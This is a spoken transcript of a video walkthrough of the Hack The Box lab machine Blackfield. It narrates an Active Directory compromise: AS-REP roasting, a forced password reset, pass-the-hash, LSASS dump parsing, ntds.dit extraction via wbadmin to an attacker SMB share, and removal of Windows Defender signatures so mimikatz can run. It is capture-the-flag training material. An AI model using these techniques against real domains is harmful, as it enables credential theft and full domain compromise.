 what's going on youtube this is ipsec i'm doing blackfield from hack the box which is a fun box around exploiting a domain it starts off with finding a bunch of usernames in an open file share and we enumerate which ones are valid and discover one has a misconfiguration the do not require pre-authentication bit is set so we could do an a s rep roast against that usually get the password hash and crack it however that doesn't provide a shell on the box the only thing we can really do from there is run a python bloodhound ingester to get bloodhound data from the domain and discover that user has the ability to set a different user's password we're going to use rpc client to reset that password and we still don't get a shell however that account has the ability to go into a forensic file share that has a memory dump of lsas so we're gonna download that run mimikatz against it and get some active credentials for the box to get a low priv shell and the user that we have is a backup user and we can perform a windows backup to extract ntds.dit it's a lot of really cool things to do so let's just jump in as always we're gonna start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats bring the nmap directory and call it black field and then the ip address which is 10 10 10 192 can take some time to run so i've already ran it looking at the results we have a bunch of information open so the very first thing i see is dns on port 53 then we have kerberos on port 88 so i glance down and see this is indeed active directory this is going to be ldap on 389 this is just an rpc port standard with most windows smb on 445 and secure ldap on 3268. and it is telling us the domain is blackfield.local i don't know what the 0 is i don't think that's part of the domain but i'm going to go ahead and just put this in my host file so sudo vi etsy host and then we can do 10 10 10 192 blackfield.local and blackfield okay and that's probably about it for the nmap there's not really anything we can do here the most important thing or interesting thing is there's no web server and this is a hack the box box so it's one of those that doesn't have a web server but it is running active directory i'm assuming it hasn't been patched for xero login but we won't be going into that because we've already done that in a previous video if you want to see it just go to ipsec.rocks and search for xero login so the very first thing i do whenever i come up against active directory is try rpc client to see if i can get like a user listing or anything so rpc client 10 1010 192. try to log in and we get access denied we do dash capital u and we're just going to put nothing for the username this is going to do like a null authentication and we get in so the query i want to run is enum dom users and we get access denied so i'm not going to do anything with um rpc client the next thing that was open was smb so i'm going to use smb client dash capital l 10 10 10 192. just hit enter for the password and we get a few file shares i'm also going to test like null authentication with this see if it does anything different and looks like the same either way with smb client now smb client doesn't do a good job at telling us what share is read only or read write or if we don't have access at all so if we want to use another tool to get that information you can either use like smb map or crack map exec i've been a big fan of crack map exact lately so we'll do cme the smb module 10 10 10 192 for the host and then dash dash shares and we're going to see this comes back and doesn't give us anything so let's try giving it a blank user for null authentication and we get nothing let's try a blank password too we get nothing as well except this time we actually got an access denied message i'm going to do a user so let's say please sub and let's see what we get doesn't give us any output after that so let's put a blank password and we actually get a authentication and it's going to dump out the shares and i went through all those errors just so you can see how finicky some tools are and that's why i like preferring like smb client first because this one behaves the most predictable and once i know i have a result then i go to a different tool like crack map exec or smb map and then try it out and if it gives me nothing i know i'm doing a command wrong but if we did smb client with like some user you can hear me typing a password it's still going to give me something because smb client just magically works not sure exactly why the difference between these two tools is probably because smb clients a legitimate tool and crack map exec is a pen testing tool and pen testing tools generally don't have the best of coders or the most like qa or testing involved so they just have a lot of finicky behavior so i always prefer using standard tools first and then pen test tools so we can read the ipc share or the profile share the profile share sounds pretty interesting so i'm going to do a smb client and then we'll do dash t cifs backslash backslash 10 10 10 192 profiles i'm going to put this in single quotes because that dollar sign is kind of a special character so it may be funky and then just put it over to mel oh i didn't need to do that we can get rid of that because i'm not mounting it yet and i'm not doing this yet yeah i was thinking i was mounting it and i typed smb client i'm surprised that still worked but smb client and we can get a bunch of users there's not a good way to go through all these directories in smb client so i'm going to use the mount command so we'll do sudo mount dash t cifs 10 10 10 192 profiles and again put that one in quotes and specify where i want to mount it to which is just slash mount i'm just going to hit enter to know password and resource busy maybe i have something in mount okay it's not mounted anymore the first one didn't air so i probably had something mounted in slash mnt so now we have it mounted i can go to cd slash mount lsla and we have all these directories so i'm going to do find dot and we'll just see if we have anything and while that runs i'm going to set up another pane and we're going to go into slash mount do ls and then pipe that over to home hdb black field oh we need pipsec hdb blackfield and then users.lst because these are a bunch of potentially valid usernames and find is trying to go into them and find me um files i guess i'm going to change up the pane because i like doing it this way better and then the next thing i generally do is i run a tool called curb route to identify if any of these users are valid users so i'm going to open up firefox because i don't know if i have this installed i know we've used it before but it doesn't look like i do so curb root and then we'll clone this or maybe there's a release let's see branches background place binaries from the release page linux amd64 is what i want save it and if you go to ipsec.rocks i'm sure you can search this tool to see me explain how it works but just know it works for now so it's a lot of stuff in my downloads i should oh that's my yeah i don't know let's just copy downloads go brute i already had it in there let's copy the latest one to curb root uh ch mod plus x curb root okay got the tool either it downloaded a folder or something but it doesn't look like it did so we can do curbroot dash h and it wants us to we want to do the user enum and we probably want to specify the dc and domain flag so i'm going to do dot slash curb route dash dash dc this is the location so 10 10 10 192 d for domain black field and then the user list file and i'm going to do the output string to um we'll call this user aneum dot list all right ow oh god curbroot.edunum uh unknown command so the text file where username has to be at the very end probably users.list curbroot oh i did not do user enum there we go so the syntax is curbrout the function you want then dash dash dc location domain controller if you have dns you don't have to specify this so if we added a resolve.com and put our active directory server there chances are we just need to do domain black field this dc flag is just there because curb route may not know where black field is dash o out file and then the text file for users so we do have audit 2020 at blackfield and remember the crack map exec if we look at the shares there is a forensic share and i think maybe we don't get descriptions with crack map exactly we did with smb client we'll see no we do so we have forensic audit share and a user audit 2020 at blackfield so that is very interesting we probably want to get onto that user just because audit and audit line up but let's let this tool finish and through the magic of video editing the command instantly finished you can see it actually took almost three minutes but we have three valid usernames to play with we could do a lot of things like set up brute forcing with this account and see if we get in that way um i'm not going to go back through all the potential paths just because the video could take a long time and brute forcing isn't really that fun so let us um edit this list because curbroot usernoom.outfile has a bunch of junk in it we just want to grab the usernames so i'm going to do awk dash capital f and we do print uh that's probably one two three four five six seven seven uh all dash we don't want f we just want to do spaces for that and that grabs all the usernames um we got a lot of like blank lines of this username thing so if we look at this file again we can probably just do grep valid on this text file and now we only have a list of usernames we probably don't want that at blackfield so i'm going to do a second awk this time with the field separator option we're going to separate on at and we can do print one to grab the very first entry i'm going to pipe this one to users dot lst i'm going to get rid of all the invalid users and then i'm also going to do one more i'm going to do two and then double quote two backslashes one and that's going to give us domain username because i don't know if i ever want that format but might as well have it while i'm doing this stuff so we got two new lists users.list and dom users i'm going to make their out files and move curb route into out files just stay a little bit organized so now i'm going to use in packet i'm going to do the cobras pre-authentication check so that is get npusers.pi and if this isn't in your path you can always do locate and packet and grep for examples and then go into this directory and do dot slash in that python script like cd this dot slash get np users so i'm gonna do get npusers.pi h for help file and let's see we want to do dash dcip101010 192. we'll try dash no pass because we don't have a password the next thing we want is dash users file and specify users.list if this doesn't work then we're going to do the other one which was the dom users.list and the target is going to be blackfield and if we weren't doing user.list this would be where the username goes but because we have the users file we don't put a user after that and that slash is oddly required and we have a hit we have this hash here so let's go and try to crack this hash i'm gonna go ssh into the kraken and this is just a box on my home network you shouldn't do any cracking inside of a vm and if i do it on my host while i'm recording a video i may get like dropped frames and stuff so that's why i always ssh off of my box to do this so i'm going to go into the hashcat folder and i'm going to be hashes we'll call it blackfield put in this ticket i'm going to cap this file because i want to grab this i'm going to do dot slash cat dash example hashes i'm going to grep for that string and that does exist so i'm gonna do dash b five to grab the five lines before that hit and we see that is mode eighteen two hundred so now i can do hash cat dash m eighteen two hundred hashes black field and then opt word list rocky.text we'll try this first and it looks like it did crack um i could go up and see what that line was but generally how i like viewing hashes is i just do the dash dash show option when hash cat is done and we can see the hash is pound zero zero uh carrot black knight so let's grab that and it should be important to note if we ran like curb route with rocky.text it would have worked eventually we would have got it um if we had done that we probably would want to do like the password policy in crack map exec so let's see smb i think it's dash dash pass paul if we can grab this uh is it password pile let's see crack map exec password policy we may not be able to actually read the file uh dash dash pass paul so i don't think we can actually read it but if we could we know the accounts don't lock and then try it this is a hack the box machine so chances are account lockout doesn't exist at all because you just have complete dental services so you could have took in those three users we had and brute forced this because the password was straight from rocky.text may have taken a while but you would have gotten it eventually so i'm going to v passwords and this is the support user i'm going to paste the password so now i have this and instead of passwords i'm going to call it credentials um credentials to me is user colon password so that's why i just did that and what i'm going to do whoops i want to copy this again and we're going to do cme smb shares dash u support dash p and put the password uh we didn't put the ip so 10 10 10 192. while that runs i'm going to do sudo umount on that and we'll do sudo mount dash t cifs dash o username equals support uh we probably could do support i think percent is how you specify password we'll try this real quick if this doesn't work then i'll just do it another way slash 10 10 10 192 we can read sysvol and net logon now but that's not too interesting the main thing i want is profiles to see if i can now go into supports profile uh that's not it maybe it's [Music] comma password equals there we go that's it so we can go into mount cd support lsla there's nothing in here um i'm just gonna go into a random directory and we can do a ls so i'm guessing all these profiles are empty we weren't getting access to knives when we tried to view them so i think this is just empty but it's good habit to check them out anyways so sudo umount on slash mount and let's try our pc client dash u support and then 10 10 10 192 paste the password uh ctrl shift second clipboard there we go we do enum dom users we got a lot of users so what i'm going to do is going to create a new user file and try the impact again okay exit v users dot this is just gonna be a temp because we gotta clean this up so we can do cat temp and then awk dash capital f and we want this print one let's print two to grab the second one and then awk dash f for field separator do it this way and i think there's probably a more efficient way where you can like [Music] do a double field separate and separate on two things but this is how i think of it in my head and it works for me so users.list like that recat users.list we have them all so let's do get np users again let that run i got the very first one and let's see what do we want to do while this happens um we could try bloodhound and we could go to windows and do bloodhound that way but let's run bloodhound from python because i don't think i've done that yet so python bloodhound which is going to google we'll do bloodhound.pie and we'll do cd opt get clone bloodhound.pie we want to go into the directory like that and we can do python 3 bloodhound to make sure it works uh bloodhound.pie and it works if um it didn't then i'd probably do oh god i did something with tmox exit okay there we are if it didn't work then i'd probably run this setup.pi or run in a docker but since it just worked i'm going to keep it like this and let's see we want to specify the username this is going to be support the password we have to go back into our credentials so cat credentials grab the password and it looks like this finished and we didn't get any new hashes so exit that exit this so we got username password we need dash dc 101010 192 and dash c i'm going to do collection method all see if this works let's see use the ns flag to specify dns server ip see dns tcp we may want dash d black field see maybe it's domain controller host name server to use for queries so maybe we want dash ns 10 10 192 and it looks like this worked dns timed out so that's not it let's see maybe we just don't specify name server let's just do this and it may resolve blackfield i was thinking it may resolve blackfield because it's in our host file so if i ping black field maybe we want local maybe it wants the full domain cannot find global catalog server dash gc 101010 192. let's see let's go back to dc 101010 192. requires a hostname fqdn blackfield.local so what i'm going to do is we're going to edit our host file and have this correct so sudo vi etsy or not host resolve.com let's do name server 10 10 10 192 and the search i think it's just black field i'll try that maybe it's blackfield.local yeah we'll try it so let's get rid of that dc flag and [Music] cannot find global catalog server dash gc black field cannot find domain controller consider specifying a domain and or a dns server ns blackfield i have no idea what's going on here pseudo vi etsy hearse let's get rid of that because now we have our um resolve dot com file set user password okay dot user got password dash ns 10 10 10 192 dash d domain to query this is blackfield.local dash dc is going to be oh it wants hostname you don't know that gc wants her's name there we go i don't know exactly what i did but we got it working so now it's enumerating um doing stuff from linux to windows is always finicky i guess that's all i can say about that but we do have a few json files so i'm going to try one thing real quick i just want to edit my host to see if this was it 10 10 10 192. blackfield and blackfield.local if we run this again does it work it does so it wasn't that change it was probably just how is doing the arguments it probably wants a fully qualified domain here and maybe this 10 10 10 192 maybe i had to put that ahead in my resolve.com i'm going to try that real quick so iv um etsy resolve dot com if i move this name server to the very top and let's get rid of this dash ns and it works so that was it um i guess you should put the active directory server at the very top of your resolve.conf the reason why i didn't do that is because if i want to go browse the internet i don't want my dns request go into this server because i suspect it just won't work so that's why i had put the name server second but if you're doing this make sure the name server is first or use that dash ns flag so at least we solve that pretty quickly um let's try now running neo4j so neo4j console this probably has to be pseudo and we can go up bloodhound linux and execute bloodhound and we log into a bloodhound instance let's now go over to files and our files are in opt bloodhound.pi we should probably move these to a blackfield directory but i'm going to drag each one over to import it and now we have successfully ran bloodhound on this domain from linux pretty cool so if we do a search let's say we're the support user right so we can mark this user uh honed and we can do queries like this like set us starting node and see if we have anything or i guess there's nothing here but we could go to uh queries which is over here queries find all domain admins we see just one it is administrator shortest path to administrator uh through enterprise admin or administrators or this user so nothing too important there dc sync you can look at things this is the domain controller this is probably administrator yep so we don't really have too much find dangerous rights for domain users group see if there's anything there we don't have anything and yeah nothing really there um we could search for users so if we search for like uh was it ly this user we could set you as high value target audit 2020 was another one set this guy as high value svc underscore backup and set u as high value and then shortest path to high value targets we can look at this and it's a mess so right here we have administrator not interesting dc1 enterprise domain controller this is domain don't really see anything uh let's do i think there was one high value from owned principles from kerberostable shorts path from owned principles still nothing i could have saw there was one that was owned to high value domain admins from earned again not gonna find anything let's try just typing these users like audit 2020 to see if there's a way to get to this user so shortest path to here to here from owned we can see shortest path to this user and this is going to list the groups that can write to them and then we get this one force change password and we've got this call here so this is the user we own so we can change this user's password we go help it's got us some abuse info if we're on windows we could just run this powershell command but i'm not going to do it through powershell because you could just copy in this and get it to work the one thing to note is when you change a user's password it's pretty noisy they'll know you change the password create a help desk ticket and that could be bad so you may want to hit make notes before you ever do this and set the password back if you ever get domain admin so if i remember we'll do that with memicats so let's go and change this user's password with our pc client so rpc client uh two c's dash u support um 10 10 10 192 uh capital yield we want the password so cat credentials grab you copy paste and we can now set the password so the actual command is set user info to and then the account name which is audit 2020 23 and then the password and if you're wondering how to find that you could just do like rpc client set password and then this post will tell you that exact command if you don't know where that 23 comes from i don't think it's actually explained here uh oh it does this msdn article so let's see where they this one is so this is the user information class and here is everything 23 is user internal for information so if we wanted to we could search for this and that is described in this field and this structure holds all attributes along with the encrypted password so you could look at like use internal five information and this is pretty much the same but this structure also carries some type of encryption so when doing pen test things we want things as simple as possible so 23 will let us do it without any encryption and just specify the plain text for the password and you can go through all the other things here but that is that so we set the password as please sub and we get this result if we want to test it and see if it works we can do crack map exec smb um 10 10 10 192 dash u audit 2020 dash p for password please sub and it's going to tell us it didn't work and the reason for that is this message this means failure not to describe uh descriptive but it's password complexity failure so put an exclamation point we don't get anything as a result so now when we do this let me put in quotes because we got a special character and we'll get a authentication success and if we do the dash dash shares now it'll tell us we can access the forensic share i think come on i did a control l to clear screen after i ran that thinking it would just move up ran it afterwards but now we finally have this forensic share as read so let's do sudo uml mount to make sure that doesn't or that isn't mounted and sudo mount dash t cfs dash o username is equal to audit 2020 password is equal to uh did i do caps probably uh 10 10 10 192 forensic slash mount and we have it mounted so if i go into slash mount we have a few things so let's go commands underscore output and we already know the domain admins uh we could look at it again but it's probably just going to be administrator or administrator and i pondered your company so i guess um maybe this is like a ir type of thing the main groups you can see what else there is nothing real interesting there the one command that is interesting to me is task list to see what tasks are running on the box powershell smart screen doesn't really look like anything stands out to me so i was hoping for like some third-party application maybe firefox and if firefox is on it maybe i know to go down and look in firefox cookies and things like that or save passwords but nothing there we can look at other things so memory analysis do it lsla and the one file that really stands out to me is lsas.zip and lsas is where um mimikatz pulls plain text passwords from so let's grab this oss.zip hdb blackfield and just copy it there and then we go into that directory and it can take a while to copy so if we do like um lsas dump linux maybe this does it extract passwords remotely there's a tool called pi picats and i think this is actually in the pip repository so i can just do pip 3 install pi pi cats and we'll do unzip lsas.zip permission denied oh i'm in memory analysis let's go back into my hdb folder unzip ls.zip and we got this ls.dump file so we can run pi picats.h to see exactly what we want to do lsa and we probably want to specify either recall or minidump um i wonder what recall is recall and then ls.dump do we have anything uh no module named e filter let's just try minidum and see if that works if this doesn't then we probably have to go through the proper way to install this tool and recall maybe using like i think that's a google product um recall recall forensics google recall so it's probably using something like that uh we got a lot of information so i'm just going to put lss.out and we can less it to go through it and right off the bat and msv we have service backup and an nt hash i'm just going to grep all nt so grep nt lsas.out and we'll do dash b three we have a few let's see and grep dash i username so we have a few service backup and administrators so let's grab both of these so less lsas.out i guess we can just grab service backup so v credentials svc underscore backup put this nt hash and then administrator see is this nt hash and let's just try using these so get credentials we can do crack map exec with this so cme smb 10 10 10 192 dash u administrator h for hash and maybe capital h we'll find out let's try dash capital h and it fails so let's try the other one it could be that memory capture is from a time before administrator had his password changed so whoops copy the wrong thing so let's copy this paste it and we'll specify svc backup and this one authenticates we don't have pwned here so we can't get into it we can try when rm i can type we can try that and if that works then we should be able to evil win rm dash i for ip 10 10 10 192 dash u spc backup dash h paste that in so since this says pwned we can do something and we are now in and we're in as service backup we could try doing other things like search for administrator at blackfield and like shortest path uh to hear from owned whoops we can now service backup mark this user has owned it's now high prep value and owned and you could play around more in bloodhound but i don't think it'll give us anything maybe shortest path from own principles black field server backup he can ps remote into dc01 we already knew that so we don't really have anything new out of bloodhound if we do who am i slash all we can see we have the sc backup and the se restore privilege and these are very dangerous privileges um you could just google around and go through these posts if you google se backup privilege talk you get through a presentation i like this is a really good one and we're essentially going to be going over this so se backup you can essentially save things out of the registry read files you normally can't access restore files backup ntds.dit with wb admin and disk shadow we're going to be doing it through wb admin i suppose there's probably write-ups doing it through disk shadow i just like this method more um i think this is showing how to do it through um disk shadow so this shows it that way and all of this is showing it through wb admin so let's do it through wb admin since you essentially have described it right here so now we don't want to exit that so in this top window we're going to create a smb server so make dirt smb cd smb smb server dot pi dash smb to support and this is going to be send me yo data that's the share name could be anything you want it i just thought send me your data would be fun um we have to do a pseudo so we can listen on 445 and now we can do the wb admin so at the query is wb admin start backup dash backup target 10 10 10 14 2 send me yo data dash include c colon windows ntds and this is the directory where ntds.dit is stored by default enter uh remote share does not exist it should so if we do net use x colon 10 10 14 2 send me yo data let's see something occurred sage mod 777 smb smb server smb2 support share let's see net use x colon slash delete no connection not found am i typing it right just going to copy and paste this is what i get for being fancy probably have a typo somewhere and just i'm blind nope i'm not sure why it can't actually read um it's bizarre let's do slash user ipsec and then please subscribe maybe we give it a username and password so dash user ipsec password please subscribe can we mount you now okay it wanted a password to mount unique but let's see we can now get into this so let's go back into c run this command again this wb admin share does not exist remote folder oh oh my god i have three tens that is embarrassing so it's trying to back up and it says a login prompt yes or no and i'm going to do echo y into this because we don't have an interactive session and that's a way to get y into this prompt so doing this it's going to take a little bit and then probably fail because i don't think this method will work within packet it wants a backup be done with ntfs so my next logical step was let's create an ntfs folder so to do that i'm going to use ddif is equal to dev0 of is equal to ntfs.disk the block size is going to be equal to one gig and then the count let's do two so we're going to create a two gigabyte ntfs disk so first we run this dd command and then we'll do hello setup so loopback setup if you do dash h you can see all the options i'm going to be doing i want petition scan and first unused device so i'm going to do f capital p on ntfs.disk and we should do sudo now if i do hello setup dash a we can see i have mounted that on dev loop zero so now i can run mkfs.ntfs on dev loop zero and that should be done through sudo and this will make a ntfs disk now that that is done we can do sudo mount and then um dev loop zero into smb and now if we do mount grep smb we can see that is mounted dev loop zero and that's ntfs.disk so we're now in that so let's do impact again uh smb server and we run this command again and unfortunately it's probably going to fail because impacted just doesn't handle ntfs well so what we could do is use the actual smb daemon the main reason i don't like doing this is because i always forget to change things back when i'm done um and it just opens your box up for more exploitation so i'm going to do 6y to yank lines on print and then p to put and let's create the directory send me yo data comment it's going to be pen tester access only please the path i'm going to try slash mount and i don't think it's going to work because we're not going to give it an ntfs disk i just want to show you the error so browseboard yes read only is going to be no guest ok yes and then we can do systemctl restart smbd uh password i forgot to do sudo there net use x colon slash delete and let's remount this we don't have a user password hopefully it lets us do it without it okay so now we have x mounted so let's do this wb admin command again and enter the username what slash delete x colon try this enter username for that we did guest ok as yes read only no i did this before with all anonymous accounts i'm not sure why it's not letting me do anonymous now to the remote share see we pointed it to slash mel so let's do chmod 77 uh make dirt temp slash black field chmod 777 temp blackfield go back into smb comp and we'll point this to temp black field restart let's just do sudo let's see c colon net use x colon slash delete it's funny i wanted to show you some troubleshooting and i'm doing more troubleshooting than i intended to do uh see if this works see i only deleted it i did not remount it temp black field watched at n1 so it looks like it may actually be working so we have that windows image backup created so it looks like it was a permission error and it just stopped we look at this there's nothing in this directory and this is going to be because we didn't have an ntfs disk this is using probably ext 3 or 4 the default linux and we could do net use x um 10 10 10 10 10 14 2 send me yo data or was it command should be backslashes so if i do dir maker test we go into test maker lol we get failed so this could be some weird umass setting and i think in smb config you may be able to set it to fix that but easier way is just use an ntfs disk so let's do net use x colon slash delete and our previous ntfs mount was in just gonna exit this and do this to get back to my home smb pwd i'm just going to copy this directory i'm going to point it to an smb directory so sudo vi the path put it here and then we'll do it's already mounted so net use we have to sudo system to restart so it's mounted xcom backslash cd x1 backslash so if i make the test one we can go into test one make dirt test two and we can go into test two so all those permissions are correct so i'm gonna go back to c we're gonna do the wb admin command yet again but this time it should work so watch dash n1 lsla we'll just see it create that windows directory and once it does we know it's going to be working so let's see the windows image backup directory exists so i'm going to go into it and we can see it's now creating files so this is what we want it's creating a vhdx i'm sure there may be a way to mount this on the linux box i don't know how so we're going to use wb admin to extract the file out of this uh virtual hard drive x so probably some weird hyper-v format for this if i do file against this do we have the magic byte there we can see microsoft disk image extended so we have that but let's let this command finish and then we'll look into how to extract spoiler it's pretty easy um let's just type it and then we'll copy and paste so echo why because we're going to do it on the prompt wb admin start recovery dash version uh we don't know this yet so put that there then dash item type we want file dash items we want to recover c colon um windows ntnts ntds ntds.dit and dash recovery target c colon backslash and then not restore acl that's going to copy the file here but don't put the same acl on so i thought this backup would be finished by the time i finished typing the command but guess not so i'm gonna pause the video and let the backup finish so we can proceed the command is now done so we can run wbm admin or wb admin get versions and we can see the backup versions uh we have this one created september 21st 2020 and this one created 10 1 20 20. i guess this is someone testing it not cleaning it up but this one is definitely me because that's today and that's my ip that's my share name so let's go back to the command we typed down here and do the version and that is going to be the version identifier so copy this paste it and we're going to run this command and it may take a little while because it's got to pull that backup file from our directory and then extract the file we want out of it so gonna let this run may take a little bit the command is finished so let's go cd backslash and do a dir and we have ntds.debt so i can just do download ntds.dit and it's going to start downloading it and put it whatever directory i was in before running that command which i'm going to guess it was my hdb black field so ls i see it start copying and there's gonna be one command we have to run after that and it's gonna be reg save hklm backslash system and we wanna save the system hive this is the registry hkey local machine system and this is where the boot key exists and this ntds.dit file is the active directory domain database but it's encrypted with the boot key that's in the system hive so what we're doing downloading the active directory database downloading the password to the active directory database and then we're going to extract all the accounts in it so it's downloading looking like it's going to take a while so yet again going to pause the video and let it finish now that the download is done we can just copy this reg save command paste it and uh maybe it's slash system oh it helps if i spell system correctly hklm system i thought it was this let's see go back to this presentation and it was reg save oh we need to say where we save it to so hklm backslash system or just call it system.hive we can download system.hive and now we can do secret stump this is another impacted script so we'll do secret stump dash ntds um ntds.dit which we should have and then dash system this is going to be system.hive and then we specify local and probably should wait for this download to finish i'm tempted to run it now and maybe it copied the boot key and can find it but probably best to wait for it to finish downloading and then run it i guess while we do this we can look at the other options of secret stump and the one that we really want is the dash history uh password last set and user status is also good like having user status is to show you disabled accounts but having history it's going to dump every like the password history it knows for that user and active directory stores old passwords because there is the option to prevent users from resetting the password the same thing it was x number of times i think maybe the defaults like 24 times ago so you'll get like the 24 lastpass was the user set and this is important because if you remember to begin the box we reset the password to audit 2020 so we're going to use the stash history flag to grab that history and still not done so we'll just let the download finish download is done so i'm going to copy this so we can run the command twice one with history one without so you can see the difference so dash history here and it'll probably take 30 40 seconds for this thing to finish so while it does i'm going to locate oh not done yet or it's done so we can just go back to this so we're looking at this and this is pretty much the same output you'd get from like a dc sync and the cool thing is you got the kobe tgt hash for like a golden ticket if you wanted to but we also got the administrator's hash so we can grab this and i'm going to go in my credentials file i'm gonna do administrator 184 fb so definitely a different password let's go and see if that one password hash matched up so if we do administrator we have history so did the creator of this box actually um do this correctly i'm guessing he did since it came from a memory dump but we see um this hash is 184 actually wanted credentials so does a hash for administrator to begin with 7f1 so if we go here and we can see the history the last password is indeed 7f1 so you can see the administrator's history which is cool um we got this has the hash so we can do ps exec dot pi administrator at 10 10 10 192. we can do dash hashes and do the ntlm colon the ntlm or you could do this blank lm hash but the lm hash portion isn't used ps exec just wants to see it so i just do ntlm colon ntlm because it's quicker so we're on this box now as system so let's go cd users administrator desktop and if we type root.text we get access is nide but we're system why are we getting that if we look at the notes i think i may have showed this but if not we see uh let's see half domain compromise autos advises to change every password change kbt gt twice disable audit 2020 i guess they didn't do that i guess ko means will do uh ps i have encrypted it on the desktop root.text if you do the cipher command um i think it's slash i don't know what the cipher help is let's see cipher slash question mark cipher.exe uh see man cipher windows here it is what is the help displays information i think that's what we want cipher slash c cipher c root.text we can see it's encrypted and only the administrator can decrypt it and if we look we are not administrator so i'm going to exit ps exec and we're going to use wmi exec because that's not going to drop us to system so wmi exec we do who am i we have blackfield administrator so now we can go into users administrator desktop and we probably could use winrm as well uh type root.txt and we get the password or file so the last thing we wanted to do is um mimikatz and set the password back so let's do locate mimicats.exe to see if i have it anywhere uh looks like we have it here uh this one's probably nowhere let's grab this upload this and then the command we want is um i think lsa dump set ntlm let's google this real quick mimikatz lsa dump ntlm set here it is equivalent to this command so it's been uploaded we can do ps exec i guess cd slash do we have left and right we don't so let's put it up here so we'll want mimikats.exe lsa dump and the username is going to be audit 2020 and the ntlm hash for this is i think we got rid of it um secret stump yeah i got rid of it so let's run secret stump again copy add this dash history and while this goes we can set the ntlm to be what it is just make sure it works so set ntlm like that oh it's done let's just get rid of this audit 2020. so this is our hash we want to set it to what it was before so grab that paste and hope for the best uh let's see dot backslash oh um one powershell we wanted to put this in our ps exact session dir did mimikats get deleted it did there must be antivirus on this so let's disable the antivirus real quick so let's go into program files so program one do a dir and there is windows defender so cd windows defender how it did dir and we got mpcmdrun.exe that's what i was looking for so dot slash mp cmd run.exe dash remove definitions dash all i think and starting engine and signature roll back to none so now let's upload memory cats again and cd backslash and while that uploads let's copy it and once that finishes we should be able to run this i need to dot backslash probably like that upload is successful dir i wonder if i don't have permission to write here users public documents upload etsy passwd this is much smaller than mimikats so if we look at this we don't have it does this have a command upload upload does not uh let's just put mimikats in our s b directory so locate mimi cats dot exe cp here and we can do net use x colon 10 10 14 2 send me yo data net use x colon maybe backslashes you can access because blocks unauthenticated guest access this is getting annoying sudo system ctl do we have mounted here still copy minicats.exe sequel and backslash windows temp cd backslash windows 10 okay we got mini cats um lsa let's copy this command and sorry this is taking so long but at least maybe you know sometimes these things just take a while and it looks like we have set that so let's verify we did so let's go back into our crack map exec so cme smb 10 10 10 192 dash u audit 2020 dash capital h i think the hash and see if we get authenticate success so we did um that is awesome so that'll be the box hope you guys enjoyed it take care and i will see you all next week